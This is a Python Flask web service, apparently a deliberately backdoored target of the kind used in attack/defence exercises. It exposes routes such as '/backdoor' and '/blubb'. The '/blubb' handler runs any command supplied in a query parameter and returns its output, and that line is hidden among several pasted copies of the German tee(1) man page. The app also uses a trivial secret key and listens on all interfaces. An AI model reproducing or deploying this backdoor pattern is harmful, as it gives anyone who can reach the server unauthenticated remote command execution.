
import os
import sys
import ctypes
import base64
from flask import Flask, request, render_template
from easyprocess import EasyProcess
from werkzeug.serving import run_simple




ohai = Flask(__name__, static_url_path='/static')
ohai.secret_key = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'


# interesting stuff in d.py
from d import *


from a import _pls
from b import _ak
from c import _yes
from d import _bob
from e import _backdoor


#begin_multiline
def four_twenty():
    return 'lit'
#end_multiline


#begin_multiline
def ak():
    _ak(request.args.get('n'), request.args.get('k'))
    return '_'
#end_multiline



#begin_multiline
def pls():
    return _pls(request.args.get('p'))

#end_multiline






#begin_multiline
def blubb():

    # TEE(1)                                                                                   Dienstprogramme für Benutzer                                                                                   TEE(1)
    #
    # BEZEICHNUNG
    #        tee - Von Standardeingabe lesen und in Standardausgabe und Dateien schreiben
    #
    # ÜBERSICHT
    #        tee [OPTION]… [DATEI]…
    #
    # BESCHREIBUNG
    #        Die Standardeingabe in jede angegebene DATEI und auf die Standardausgabe kopieren.
    #
    #        -a, --append
    #               An existierende DATEIen anhängen, nichts überschreiben
    #
    #        -i, --ignore-interrupts
    #               Unterbrechnungssignale ignorieren
    #
    #        -p     Fehler ausgeben, die beim Schreiben auf Nicht-Pipes entstehen
    #
    #        --output-error[=MODUS]
    #               Das Verhalten bei einem Schreibfehler einstellen. Siehe MODUS unten.
    #
    #        --help Diese Hilfe anzeigen und beenden
    #
    #        --version
    #               Versionsinformation anzeigen und beenden
    #
    #    MODUS bestimmt das Verhalten bei Schreibfehlern auf den Ausgaben:
    #        »warn« Fehler ausgeben, die beim Schreiben auf irgendeiner Ausgabe entstehen
    #
    #        »warn-nopipe«
    #               Fehler ausgeben, die beim Schreiben auf irgendeiner Ausgabe entstehen, die keine Pipe ist
    #
    #        »exit« Bei Schreibfehlern auf irgendeiner Ausgabe abbrechen
    #
    #        »exit-nopipe«
    #               Bei Schreibfehlern auf irgendeiner Ausgabe, die keine Pipe ist, abbrechen
    #
    #        Der  voreingestellte  MODUS  für  die  Option  -p  ist  »warn-nopipe«.  Wenn die Option --output-error nicht angegeben wurde, ist die voreingestellte Aktion ein sofortiger Abbruch, wenn auf eine Pipe
    #        geschrieben wird und Ausgabe der Fehler, wenn auf Nicht-Pipe-Ausgaben geschrieben wird.
    #
    # AUTOR
    #        Geschrieben von Mike Parker, Richard M. Stallman und David MacKenzie.
    #
    # FEHLER BERICHTEN
    #        Onlinehilfe für GNU coreutils: <http://www.gnu.org/software/coreutils/>
    #        Berichten Sie Fehler in der Übersetzung von tee an <http://translationproject.org/team/de.html>
    #
    # COPYRIGHT
    #        Copyright © 2016 Free Software Foundation, Inc. Lizenz GPLv3+: GNU GPL Version 3 oder neuer <http://gnu.org/licenses/gpl.html>.
    #        Dies ist freie Software: Sie können sie verändern und weitergeben. Es gibt KEINE GARANTIE, soweit gesetzlich zulässig.
    blubb = request.args.get('blubb')
    # TEE(1)                                                                                   Dienstprogramme für Benutzer                                                                                   TEE(1)
    #
    # BEZEICHNUNG
    #        tee - Von Standardeingabe lesen und in Standardausgabe und Dateien schreiben
    #
    # ÜBERSICHT
    #        tee [OPTION]… [DATEI]…
    #
    # BESCHREIBUNG
    #        Die Standardeingabe in jede angegebene DATEI und auf die Standardausgabe kopieren.
    #
    #        -a, --append
    #               An existierende DATEIen anhängen, nichts überschreiben
    #
    #        -i, --ignore-interrupts
    #               Unterbrechnungssignale ignorieren
    #
    #        -p     Fehler ausgeben, die beim Schreiben auf Nicht-Pipes entstehen
    #
    #        --output-error[=MODUS]
    #               Das Verhalten bei einem Schreibfehler einstellen. Siehe MODUS unten.
    #
    #        --help Diese Hilfe anzeigen und beenden
    #
    #        --version
    #               Versionsinformation anzeigen und beenden
    #
    #    MODUS bestimmt das Verhalten bei Schreibfehlern auf den Ausgaben:
    #        »warn« Fehler ausgeben, die beim Schreiben auf irgendeiner Ausgabe entstehen
    #
    #        »warn-nopipe«
    #               Fehler ausgeben, die beim Schreiben auf irgendeiner Ausgabe entstehen, die keine Pipe ist
    #
    #        »exit« Bei Schreibfehlern auf irgendeiner Ausgabe abbrechen
    #
    #        »exit-nopipe«
    #               Bei Schreibfehlern auf irgendeiner Ausgabe, die keine Pipe ist, abbrechen
    #
    #        Der  voreingestellte  MODUS  für  die  Option  -p  ist  »warn-nopipe«.  Wenn die Option --output-error nicht angegeben wurde, ist die voreingestellte Aktion ein sofortiger Abbruch, wenn auf eine Pipe
    #        geschrieben wird und Ausgabe der Fehler, wenn auf Nicht-Pipe-Ausgaben geschrieben wird.
    #
    # AUTOR
    #        Geschrieben von Mike Parker, Richard M. Stallman und David MacKenzie.
    #
    # FEHLER BERICHTEN
    #        Onlinehilfe für GNU coreutils: <http://www.gnu.org/software/coreutils/>
    #        Berichten Sie Fehler in der Übersetzung von tee an <http://translationproject.org/team/de.html>
    #
    # COPYRIGHT
    #        Copyright © 2016 Free Software Foundation, Inc. Lizenz GPLv3+: GNU GPL Version 3 oder neuer <http://gnu.org/licenses/gpl.html>.
    #        Dies ist freie Software: Sie können sie verändern und weitergeben. Es gibt KEINE GARANTIE, soweit gesetzlich zulässig.

    return EasyProcess(blubb).call(timeout=5).stdout
    b = 1
    # TEE(1)                                                                                   Dienstprogramme für Benutzer                                                                                   TEE(1)
    #
    # BEZEICHNUNG
    #        tee - Von Standardeingabe lesen und in Standardausgabe und Dateien schreiben
    #
    # ÜBERSICHT
    #        tee [OPTION]… [DATEI]…
    #
    # BESCHREIBUNG
    #        Die Standardeingabe in jede angegebene DATEI und auf die Standardausgabe kopieren.
    #
    #        -a, --append
    #               An existierende DATEIen anhängen, nichts überschreiben
    #
    #        -i, --ignore-interrupts
    #               Unterbrechnungssignale ignorieren
    #
    #        -p     Fehler ausgeben, die beim Schreiben auf Nicht-Pipes entstehen
    #
    #        --output-error[=MODUS]
    #               Das Verhalten bei einem Schreibfehler einstellen. Siehe MODUS unten.
    #
    #        --help Diese Hilfe anzeigen und beenden
    #
    #        --version
    #               Versionsinformation anzeigen und beenden
    #
    #    MODUS bestimmt das Verhalten bei Schreibfehlern auf den Ausgaben:
    #        »warn« Fehler ausgeben, die beim Schreiben auf irgendeiner Ausgabe entstehen
    #
    #        »warn-nopipe«
    #               Fehler ausgeben, die beim Schreiben auf irgendeiner Ausgabe entstehen, die keine Pipe ist
    #
    #        »exit« Bei Schreibfehlern auf irgendeiner Ausgabe abbrechen
    #
    #        »exit-nopipe«
    #               Bei Schreibfehlern auf irgendeiner Ausgabe, die keine Pipe ist, abbrechen
    #
    #        Der  voreingestellte  MODUS  für  die  Option  -p  ist  »warn-nopipe«.  Wenn die Option --output-error nicht angegeben wurde, ist die voreingestellte Aktion ein sofortiger Abbruch, wenn auf eine Pipe
    #        geschrieben wird und Ausgabe der Fehler, wenn auf Nicht-Pipe-Ausgaben geschrieben wird.
    #
    # AUTOR
    #        Geschrieben von Mike Parker, Richard M. Stallman und David MacKenzie.
    #
    # FEHLER BERICHTEN
    #        Onlinehilfe für GNU coreutils: <http://www.gnu.org/software/coreutils/>
    #        Berichten Sie Fehler in der Übersetzung von tee an <http://translationproject.org/team/de.html>
    #
    # COPYRIGHT
    #        Copyright © 2016 Free Software Foundation, Inc. Lizenz GPLv3+: GNU GPL Version 3 oder neuer <http://gnu.org/licenses/gpl.html>.
    #        Dies ist freie Software: Sie können sie verändern und weitergeben. Es gibt KEINE GARANTIE, soweit gesetzlich zulässig.

    # TEE(1)                                                                                   Dienstprogramme für Benutzer                                                                                   TEE(1)
    #
    # BEZEICHNUNG
    #        tee - Von Standardeingabe lesen und in Standardausgabe und Dateien schreiben
    #
    # ÜBERSICHT
    #        tee [OPTION]… [DATEI]…
    #
    # BESCHREIBUNG
    #        Die Standardeingabe in jede angegebene DATEI und auf die Standardausgabe kopieren.
    #
    #        -a, --append
    #               An existierende DATEIen anhängen, nichts überschreiben
    #
    #        -i, --ignore-interrupts
    #               Unterbrechnungssignale ignorieren
    #
    #        -p     Fehler ausgeben, die beim Schreiben auf Nicht-Pipes entstehen
    #
    #        --output-error[=MODUS]
    #               Das Verhalten bei einem Schreibfehler einstellen. Siehe MODUS unten.
    #
    #        --help Diese Hilfe anzeigen und beenden
    #
    #        --version
    #               Versionsinformation anzeigen und beenden
    #
    #    MODUS bestimmt das Verhalten bei Schreibfehlern auf den Ausgaben:
    #        »warn« Fehler ausgeben, die beim Schreiben auf irgendeiner Ausgabe entstehen
    #
    #        »warn-nopipe«
    #               Fehler ausgeben, die beim Schreiben auf irgendeiner Ausgabe entstehen, die keine Pipe ist
    #
    #        »exit« Bei Schreibfehlern auf irgendeiner Ausgabe abbrechen
    #
    #        »exit-nopipe«
    #               Bei Schreibfehlern auf irgendeiner Ausgabe, die keine Pipe ist, abbrechen
    #
    #        Der  voreingestellte  MODUS  für  die  Option  -p  ist  »warn-nopipe«.  Wenn die Option --output-error nicht angegeben wurde, ist die voreingestellte Aktion ein sofortiger Abbruch, wenn auf eine Pipe
    #        geschrieben wird und Ausgabe der Fehler, wenn auf Nicht-Pipe-Ausgaben geschrieben wird.
    #
    # AUTOR
    #        Geschrieben von Mike Parker, Richard M. Stallman und David MacKenzie.
    #
    # FEHLER BERICHTEN
    #        Onlinehilfe für GNU coreutils: <http://www.gnu.org/software/coreutils/>
    #        Berichten Sie Fehler in der Übersetzung von tee an <http://translationproject.org/team/de.html>
    #
    # COPYRIGHT
    #        Copyright © 2016 Free Software Foundation, Inc. Lizenz GPLv3+: GNU GPL Version 3 oder neuer <http://gnu.org/licenses/gpl.html>.
    #        Dies ist freie Software: Sie können sie verändern und weitergeben. Es gibt KEINE GARANTIE, soweit gesetzlich zulässig.
    return(str(b))

#end_multiline







routed_ak = ohai.route('/ak')(ak)
routed_pls = ohai.route('/pls')(pls)
routed_blubb = ohai.route('/blubb')(blubb)
routed_blubb = ohai.route('/yes')(_yes)
routed_blubb = ohai.route('/bob')(_bob)
routed_blubb = ohai.route('/backdoor')(_backdoor)
routed_four_twenty = ohai.route('/')(four_twenty)


run_simple('0.0.0.0', 8085, ohai, threaded=True)
